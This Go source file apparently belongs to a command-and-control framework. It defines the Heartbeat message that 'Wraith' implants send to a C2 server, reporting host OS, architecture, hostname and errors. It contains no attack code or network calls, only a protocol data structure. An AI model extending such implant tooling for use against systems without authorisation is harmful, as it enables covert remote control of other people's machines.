package proto

// The structure of heartbeats which Wraiths send to c2 to register
// their status and presence.
type Heartbeat struct {
	// The operating system Wraith is running on.
	HostOS string

	// The CPU architecture of the host.
	HostArch string

	// The system hostname.
	Hostname string

	// A list of errors the Wraith has encountered.
	Errors []error
}
